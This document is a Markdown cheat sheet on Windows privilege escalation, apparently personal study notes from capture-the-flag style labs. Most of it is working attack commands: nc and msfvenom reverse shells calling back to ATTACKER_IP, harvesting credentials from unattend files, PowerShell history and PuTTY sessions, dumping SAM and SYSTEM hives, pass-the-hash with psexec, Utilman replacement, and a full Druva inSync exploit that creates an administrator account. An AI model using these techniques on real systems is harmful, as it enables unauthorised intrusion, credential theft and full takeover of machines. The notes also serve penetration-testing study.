# Windows Privilege Escalation

Windows Users :  
- Administrators
- Standard Users

Built-in account : 
- SYSTEM / LocalSystem : full access (even more than administrators)
- Local Service : Default account with the least privileges but uses anonymous connections
- Network Service : Default account with the least privileges but it will use the computer credentials to authenticate through the network

## Tools
- [WinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```
- [Windows-Exploit-Suggester NG](https://github.com/bitsadmin/wesng)
- Metasploit (`multi/recon/local_exploit_suggester`)


## Harvesting Credentials

#### Files :
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

### Powershell History :
Powershell history can be retrieved using a command :  
In Powershell :
```Powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
In cmd:
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
#### Saved Windows Credentials
```cmd
cmdkey /list
```
Run a command as an other user using saved credentials
```cmd
runas /savecred /user:admin cmd.exe
```

### IIS Configuration 
The default web server on Windows installations  

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems  
While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.  

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```



## Other Quick Wins

#### Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify

```cmd
schtasks /query /tn vulntask /fo list /v
```

`/tn taskname` specify a taskname, the taskname is different from the executed filename
`/fo list` display the output as list  
`/v` verbose  


To check file permissions
```cmd
icacls file.txt
```
If possible, you can pop a reverse shell
- (M) means Modify
- (RX) means Readable & Executable
- (F) means Full Access

More : https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/icacls

**Reverse shell payload**
```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

**Local machine**
```bash
nc -lvnp 4444
```


If permissions are set, user can trigger the task with the malicious file
```cmd
schtasks /run /tn TASKNAME
```


### AlwaysInstallElevated

Windows intaller Files (.msi files) are used to install applications on the system.  
They usually run with the privilege level of the user that starts it.  
However, these can be configured to run with higher privileges from any user account.  
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

A .msi file can be created using msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

You have to transfer the file  
Make sure that a Metasploit Handler is set and runs correctly

You can start the reverse shell : 
```cmd
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```


## Abusing Service Misconfiguration

Windows services are run by SCM (Service Control Manager)   
Each service is associated with an executable (it implements some specific stuff to be launched by the SCM (not all executable can be run as services))  
Each service specify the user account it is run as  
Services have a Discretionary Access Control List (DACL), which indicates who has permission to edit it

Service configurations are stored here : `HKLM\SYSTEM\CurrentControlSet\Services\`


#### Insecure Permissions on Service Executable

We can use `sc` to ask the SCM infos and `qc` specify a service to ask for  
The goal is to retrieve the executable path and the user it runs as for example
```cmd
sc qc SERVICE_NAME
```

Example : We found a service that runs a .exe with modification right, let's exploit it
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server 8000
```

```powershell
wget http://LOCAL_IP:8000/rev-svc.exe -O rev-svc.exe
```

**Grant Full access to everyone group**
```cmd
icacls WService.exe /grant Everyone:F
```

**Restart a service**
```
sc start SERVICE_NAME
sc stop SERVICE_NAME
```

or in powershell (sc is aliased to Set-Content)
```powershell
sc.exe start SERVICE_NAME
sc.exe stop SERVICE_NAME
```
or 
```powershell
Start-Service SERVICE_NAME
Stop-Service SERVICE_NAME
```

**Start the listener**
```bash
nc -lvnp LOCAL_PORT 
```


### Unquoted Service Paths

If the executable run by the service isn't quoted properly and contains spaces.  
The file is ambiguous. 

Example : the path is **C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe**
The SCM doesn't know wich version to execute

| Command                                                | Argument 1                 | Argument 2                 |
| :----------------------------------------------------- | :------------------------- | :------------------------- |
| C:\MyPrograms\Disk.exe                                 | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                          | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk  Sorter  Enterprise\bin\disksrs.exe |                            |                            |

The SCM will search for option 1 to option 3 in order  
This means that we can create an executable 

Follow Insecure Permissions steps

#### Insecure Service Permissions
If the DACL allows you to modify the configuration of a service, you will be able to reconfigure the service.  
This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM !

You can use https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk to check for the DACL Service

```cmd
accesschk64.exe -qlc SERVICE_NAME
```

This response means permissions are no well set :

```
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```
Let's exploit it

```powershell
# import the .exe reverse shell to execute
wget http://....:.../FILE.exe -O rev.exe
```

```cmd
# Change rights (like chmod 777 under Unix)
icacls C:\Users\PATH_TO_REVERSE_SHELL\rev.exe /grant Everyone:F
# Change the service configuration 
sc config SERVICE_NAME binPath= "C:\PATH_TO_REVERSE_SHELL\rev.exe" obj= LocalSystem
```

**Malicious service will require a restart**
```cmd
C:\> sc stop THMService
C:\> sc start THMService
```

## Abusing Dangerous Privileges

Each user has a set of assigned privileges that can be checked with the following command:
```cmd
whoami /priv
```

A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

#### SeBackup / SeRestore

Allow users to read and write to any file in the system, ignoring any DACL in place.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash

**Backup the SAM and SYSTEM hashes**

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

## Dumping SAM/SYSTEM secrets

```bash
python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

## Pass the hash

Gaining `RCE` by passing the hash
```bash
python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.177.117
```

### SeTakeOwnership

The `SeTakeOwnership` privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like

```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant USERNAME:F
copy cmd.exe utilman.exe
```

Click on the "Ease of access button" (the one in the middle and a `cmd` process will pop up)
![](../images/Pasted%20image%2020240416150639.png)

## SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf.
**Impersonation usually consists of being able to spawn a process or thread under the security context of another user.**

We will use this tool to get a reverse shell https://github.com/antonioCoco/RogueWinRM

```cmd
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe LOCAL_IP LOCAL_PORT"
```

```bash
nc -lvnp PORT
```

The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.

## Abusing Vulnerable Software

### Unpatched software

Software installed on the target system can present various privilege escalation opportunities.
As with drivers, organisations and users may not update them as often as they update the operating system.

**List softwares**
```cmd
wmic product get name,version,vendor
```

Remember that the `wmic product` command may not return all installed programs.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or plain old [Google](https://www.google.com/), amongst many others.

## Druva inSync 6.6.3

The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.

**This will create user `pwnd` with a password of `SimplePass123` and add it to the administrators' group.**

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

## Metasploit

```msfconsole
run post/multi/recon/local_exploit_suggester
```

```msfconsole
run path/to/exploit 
```

Notice that it isn't because the exploit doesn't escalate us to` nt authority/ System` that it hasn't worked.  
Checks permissions with `getprivs`, some may have appeared

## Meterpreter auto
```msfconsole
getsystem
```
Notice that sometimes, it will require some manual meterpreter privesc before to be able to escalate us to nt auhtority/system


## More learnings

- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
